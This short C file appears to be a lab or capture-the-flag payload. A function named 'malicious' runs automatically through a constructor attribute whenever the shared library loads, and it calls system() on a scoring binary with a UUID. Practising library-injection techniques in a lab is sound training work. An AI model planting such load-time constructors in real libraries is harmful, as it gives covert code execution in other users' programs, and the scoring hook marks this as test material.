#include <stdio.h>
#include <stdlib.h>

//This allows it to run immediately when a shared library is loaded
//during program startup 

static void malicious() __attribute__((constructor));

void malicious() {
	system("/usr/local/bin/score e9386e46-d475-41b0-a058-eaf73474ec1c");
}
